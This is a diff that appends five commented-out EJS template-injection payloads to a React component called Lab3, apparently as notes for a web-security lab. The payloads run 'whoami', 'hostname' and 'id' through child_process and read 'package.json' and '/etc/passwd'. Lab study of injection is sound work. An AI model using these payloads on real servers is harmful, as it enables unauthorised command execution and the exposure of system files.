@@ -57,3 +57,10 @@ const Lab3 = () => {
 };
 
 export default Lab3;
+
+
+// <%= require("fs").readFileSync("package.json", "utf8") %>
+// <%= require("child_process").execSync("whoami").toString() %>
+// <%=require("child_process").execSync("hostname").toString() %>
+// <%= require("child_process").execSync("id").toString() %>
+// <%= require("fs").readFileSync("/etc/passwd", "utf8") %>
